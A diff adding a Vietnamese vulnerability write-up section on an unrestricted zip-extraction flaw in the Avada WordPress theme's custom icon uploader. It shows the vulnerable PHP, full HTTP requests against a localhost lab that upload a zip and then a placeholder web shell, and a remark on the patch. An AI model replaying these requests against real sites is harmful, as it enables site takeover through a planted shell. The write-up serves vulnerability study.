@@ -335,9 +335,178 @@ Connection: close
 
 ![Alt text](./images/image23.png)
 
+## III. Author+ Unrestricted Zip Extraction
+- Lổ hổng Extract file zip icon khi author import icon.  
+- Tạo 1 icon set.
 
+![Alt text](./images/image24.png)
+- Upload 1 file zip không phải là icon lên.
 
+![Alt text](./images/image25.png)
 
+- Upload
+```
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+Content-Length: 697
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+sec-ch-ua-platform: "Windows"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzIACVdvGE66Dww7V
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/wordpress/wp-admin/post.php?post=76&action=edit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
+Connection: close
+
+------WebKitFormBoundaryzIACVdvGE66Dww7V
+Content-Disposition: form-data; name="name"
+
+flag.zip
+------WebKitFormBoundaryzIACVdvGE66Dww7V
+Content-Disposition: form-data; name="_ajax_nonce"
+
+f07b5bb954
+------WebKitFormBoundaryzIACVdvGE66Dww7V
+Content-Disposition: form-data; name="action"
+
+fusion-icons-uploader-action
+------WebKitFormBoundaryzIACVdvGE66Dww7V
+Content-Disposition: form-data; name="async-upload"; filename="flag.zip"
+Content-Type: application/x-zip-compressed
+
+PK---content-file-zip
+------WebKitFormBoundaryzIACVdvGE66Dww7V--
+```
+- Upload file sẽ do fusion-icons-uploader-action xử lý.
+
+![Alt text](./images/image26.png)
+
+- Lỗ hổng tồn tại ở chức năng process_upload tại wp-content/themes/Avada/includes/lib/inc/custom-icons/class-fusion-custom-icon-set.php
+
+```php
+---
+$package_path = get_attached_file( $icon_set['attachment_id'] );
+
+$status = false;
+
+if ( $package_path && file_exists( $package_path ) ) {
+    // Create icon set path.
+    $icon_set_dir_name = $this->get_unique_dir_name( pathinfo( $package_path, PATHINFO_FILENAME ), FUSION_ICONS_BASE_DIR );
+    $icon_set_path     = FUSION_ICONS_BASE_DIR . $icon_set_dir_name;
+
+    // Create icon set directory.
+    wp_mkdir_p( $icon_set_path );
+
+    // Attempt to manually extract the zip file first. Required for fptext method.
+    if ( class_exists( 'ZipArchive' ) ) {
+        $zip = new ZipArchive();
+        if ( true === $zip->open( $package_path ) ) {
+            $zip->extractTo( $icon_set_path );
+            $zip->close();
+            $status = true;
+        }
+    } else {
+        $status = unzip_file( $package_path, $icon_set_path );
+    }
+}
+---
+```
+
+- Sau khi kiểm tra xem file zip đã được upload hay không thì kiểm tra xem đường dẫn có tồn tại hay không và đổi tên file. 
+- Check các thông tin xong thì sẽ extreact file vào /upload/fusion-icons/
+
+```php
+if ( class_exists( 'ZipArchive' ) ) {
+    $zip = new ZipArchive();
+    if ( true === $zip->open( $package_path ) ) {
+        $zip->extractTo( $icon_set_path );
+        $zip->close();
+        $status = true;
+    }
+} else {
+    $status = unzip_file( $package_path, $icon_set_path );
+}
+```
+- Vì vậy việc upload file zip php sẽ unzip nó và đưa vào uploads có thể truy cập được.
+
+- Upload shell
+```
+POST /wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+Content-Length: 902
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+sec-ch-ua-platform: "Windows"
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeYEFfSWInvFCB1cE
+Accept: */*
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/wordpress/wp-admin/post-new.php?post_type=fusion_icons
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
+Connection: close
+
+------WebKitFormBoundaryeYEFfSWInvFCB1cE
+Content-Disposition: form-data; name="name"
+
+test.zip
+------WebKitFormBoundaryeYEFfSWInvFCB1cE
+Content-Disposition: form-data; name="_ajax_nonce"
+
+f07b5bb954
+------WebKitFormBoundaryeYEFfSWInvFCB1cE
+Content-Disposition: form-data; name="action"
+
+fusion-icons-uploader-action
+------WebKitFormBoundaryeYEFfSWInvFCB1cE
+Content-Disposition: form-data; name="async-upload"; filename="test.zip"
+Content-Type: application/x-zip-compressed
+
+PK-content-zip-shell-file
+```
+
+- Request unzip file
+```
+POST /wordpress/wp-admin/post.php HTTP/1.1
+Host: localhost
+Content-Length: 993
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: http://localhost/wordpress/wp-admin/post-new.php?post_type=fusion_icons&wp-post-new-reload=true
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: wordpress_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C4424ea9d198d605e77bb3dda3b38572bec6aef735bacee774bd20458958a10b2; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_bbfa5b726c6b7a9cf3cda9370be3ee91=admin%7C1694317669%7CpQV2XSHniTz62hqZMfM7Mf0xIioq7TCi03aJr0QW14L%7C429e15ff3ff283381731bafe13c5110823754a6cc42e036d7590e3a211821d53; wp-settings-1=editor%3Dtinymce; wp-settings-time-1=1694144870; testcookie=; am_username=; am_check=; memarketing-_zldp=Mltw9Iqq5RQZSO3V%2BzsvBcNWWgn4MPqtgkD49oq5K0JAoyZxNsNt%2FX8EdhLYh1dsrq2vjv8sJRs%3D; selectedtab=2_1; selectedDropDown=monitortabtd; session_id=70169739c0413b46c980e543e69c53ee17d81244; fusionredux_current_tab=83
+Connection: close
+
+_wpnonce=08f02fb466&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fpost-new.php%3Fpost_type%3Dfusion_icons&user_ID=1&action=editpost&originalaction=editpost&post_author=1&post_type=fusion_icons&original_post_status=auto-draft&referredby=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D76%26action%3Dedit&_wp_original_http_referer=http%3A%2F%2Flocalhost%2Fwordpress%2Fwp-admin%2Fpost.php%3Fpost%3D76%26action%3Dedit&auto_draft=&post_ID=81&meta-box-order-nonce=02f654687c&closedpostboxesnonce=b3ffe0660d&post_title=test&samplepermalinknonce=40e495fd42&hidden_post_status=draft&post_status=draft&hidden_post_password=&hidden_post_visibility=public&visibility=public&post_password=&mm=09&jj=08&aa=2023&hh=08&mn=57&ss=41&hidden_mm=09&cur_mm=09&hidden_jj=08&cur_jj=08&hidden_aa=2023&cur_aa=2023&hidden_hh=08&cur_hh=08&hidden_mn=57&cur_mn=57&original_publish=%C4%90%C4%83ng&publish=%C4%90%C4%83ng&post_name=&fusion-custom-icons%5Battachment_id%5D=82&fusion-custom-icons-nonce=f07b5bb954
+```
+![Alt text](./images/image27.png)
+
+![Alt text](./images/image28.png)
+
+- Ở bản patch thì chỉ chấp nhận 1 số tệp zip để thì mới unzip.
+
+![Alt text](./images/image29.png)
 # Tham khảo
 - https://patchstack.com/articles/multiple-high-and-critical-vulnerabilities-in-avada-theme-and-plugin/#:~:text=The%20Avada%20theme%20itself%20also,execution%20on%20the%20WordPress%20site.
-- https://sec.vnpt.vn/2023/05/exploiting-file-upload-vulnerability-with-race-conditions-challenge-for-you/
